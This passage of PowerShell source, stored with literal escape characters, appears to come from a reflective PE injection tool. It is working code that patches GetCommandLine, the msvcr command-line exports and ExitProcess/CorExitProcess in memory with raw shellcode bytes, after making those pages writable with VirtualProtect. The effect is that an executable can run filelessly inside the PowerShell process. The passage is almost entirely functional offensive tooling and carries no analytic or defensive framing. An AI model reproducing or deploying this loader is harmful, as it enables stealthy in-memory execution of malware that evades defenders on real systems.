shellcode\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode1 = @()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PtrSize -eq 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Shellcode1 += 0x48 \u00a0\u00a0\u00a0#64bit shellcode has the 0x48 before the 0xb8\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Shellcode1 += 0xb8\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode2 = @(0xc3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Make copy of GetCommandLineA and GetCommandLineW\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Overwrite GetCommandLineA\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success = $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineAAddrTemp = $GetCommandLineAAddr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Overwrite GetCommandLineW\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success = $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineWAddrTemp = $GetCommandLineWAddr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#For C++ stuff that is compiled with visual studio as \"multithreaded DLL\", the above method of overwriting GetCommandLine doesn't work.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0I don't know why exactly.. But the msvcr DLL that a \"DLL compiled executable\" imports has an export called _acmdln and _wcmdln.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllList = @(\"msvcr70d.dll\", \"msvcr71d.dll\", \"msvcr80d.dll\", \"msvcr90d.dll\", \"msvcr100d.dll\", \"msvcr110d.dll\", \"msvcr70.dll\" `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0, \"msvcr71.dll\", \"msvcr80.dll\", \"msvcr90.dll\", \"msvcr100.dll\", \"msvcr110.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0foreach ($Dll in $DllList)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($DllHandle -ne [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_wcmdln\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_acmdln\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\"Error, couldn't find _wcmdln or _acmdln\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success = $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success = $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray = @()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#CorExitProcess (compiled in to visual studio c++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(\"mscoree.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($MscoreeHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"mscoree handle null\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, \"CorExitProcess\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($CorExitProcessAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"CorExitProcess address not found\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExitFunctions += $CorExitProcessAddr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#ExitProcess (what non-managed programs use)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"ExitProcess\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ExitProcessAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"ExitProcess address not found\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExitFunctions += $ExitProcessAddr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0foreach ($ProcExitFunctionAddr in $ExitFunctions)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#The following is the shellcode (Shellcode: ExitThread.asm):\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#32bit shellcode\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode1 = @(0xbb)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#64bit shellcode (Shellcode: ExitThread.asm)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PtrSize -eq 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode1 = @(0x48, 0xbb)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Shellcode3 = @(0xff, 0xd3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"ExitThread\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ExitThreadAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"ExitThread address not found\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Make copy of original ExitProcess bytes\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0call ExitThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $ReturnArray\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)\n\t\t\t\u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0It copies Count bytes from Source to Destination.\n\t\t\t\u00a0\u00a0\u00a0Function Copy-ArrayOfMemAddresses\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Array[]]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CopyInfo,\n\t\t\t\u00a0\u00a0\u00a0 